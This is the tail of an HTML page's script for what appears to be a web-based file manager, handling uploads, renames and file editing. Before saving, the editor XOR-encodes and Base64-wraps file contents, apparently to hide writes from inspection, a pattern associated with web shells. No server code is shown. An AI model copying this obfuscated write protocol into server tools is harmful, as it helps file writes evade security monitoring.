          // Both failed
          throw altErr;
        }
      }

      okCount++;
    }catch(err){
      console.error(err);
      failCount++;
      toast(`${file.name}: ${err?.message || 'Upload failed'}`, 'err', 3600);
    }
  }

  resetUploadForm();
  if (okCount) toast(`Uploaded ${okCount} file(s)`, 'ok');
  if (failCount) toast(`${failCount} upload(s) failed`, 'err');

  await refresh();
});

/* ===== Rename form ===== */
const renameForm   = document.getElementById('renameForm');
const oldNameInput = document.getElementById('oldName');
const newNameInput = document.getElementById('newName');

if (renameForm) {
  renameForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const oldVal = (oldNameInput?.value || '').trim();
    const newVal = (newNameInput?.value || '').trim();

    if (!oldVal || !newVal) { toast('Please fill both names.', 'warn'); return; }

    try {
      await api('rename', { old: oldVal, new: newVal }); // shikigf handled in api()
      toast(`Renamed "${oldVal}" → "${newVal}"`, 'ok');
      oldNameInput.value = '';
      newNameInput.value = '';
      await refresh();
    } catch (err) {
      toast(err.message || 'Rename failed', 'err');
    }
  });
}

/* ===== Editor XOR (save only) — send Base64 (existing editor protocol) ===== */
function editorKey(i){
  const h = ((i*31 + 7) >>> 0).toString(16);
  const last2 = h.slice(-2);
  const hx = parseInt(last2 || '0', 16);
  const k = ((hx ^ (i & 0xFF)) + Math.floor(Math.log10(i + 3) * 97)) & 0xFF;
  return k;
}
function editorEncodeToBinaryString(str){
  let out = [];
  for (let i = 0; i < str.length; i++){
    const code = str.charCodeAt(i) & 0xFF;
    out.push(String.fromCharCode(code ^ editorKey(i)));
  }
  return out.join('');
}
function b64EncodeBinary(str){ return btoa(str); }

const editorModal = document.getElementById('editorModal');
const editorArea = document.getElementById('editorArea');
const editorTitle = document.getElementById('editorTitle');
document.getElementById('editorClose').addEventListener('click', ()=>{ resetUploadForm(); closeEditor(); });
document.getElementById('editorSave').addEventListener('click', saveEditor);

function openEditor(name){
  editorTitle.textContent = 'Edit: ' + name;
  editorArea.value = 'Loading…';
  editorModal.style.display = 'flex';
  state.editing.name = name;
  api('read', { name })
    .then(j => { editorArea.value = j.content || ''; })
    .catch(e => { editorArea.value = ''; toast(e.message, 'err'); });
}
function closeEditor(){ editorModal.style.display = 'none'; state.editing.name = null; }

async function saveEditor(){
  const name = state.editing.name;
  if (!name) return;
  try {
    const plain = editorArea.value;
    const bin   = editorEncodeToBinaryString(plain);
    const b64   = b64EncodeBinary(bin);
    await api('save', { name, content_b64: b64 });
    closeEditor();
    resetUploadForm();
    toast(`Saved "${name}"`, 'ok');
    await refresh();
  } catch(e){ toast(e.message, 'err'); }
}
window.addEventListener('keydown', (e)=>{ if (e.key === 'Escape' && editorModal.style.display === 'flex') closeEditor(); });

refresh();
</script>
</body>
</html>
